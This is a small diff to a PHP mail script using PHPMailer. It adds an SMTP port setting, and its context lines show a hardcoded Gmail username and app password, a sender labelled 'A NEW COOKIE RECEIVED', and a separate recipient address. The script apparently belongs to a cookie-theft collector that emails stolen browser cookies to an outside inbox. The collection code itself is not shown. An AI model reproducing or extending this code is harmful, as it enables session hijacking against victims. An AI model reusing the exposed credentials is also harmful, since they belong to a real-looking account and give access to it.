@@ -33,6 +33,7 @@ EOF;
   $mail->Username = 'carterreginald24@gmail.com';                 // SMTP username
   $mail->Password = 'fqbjmddjkxsnumgr';                           // SMTP password
   $mail->SMTPSecure = 'tls';
+  $mail->Port  = 587;
   
   $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
   $mail->addAddress('kk442242@gmail.com', 'Receiver');
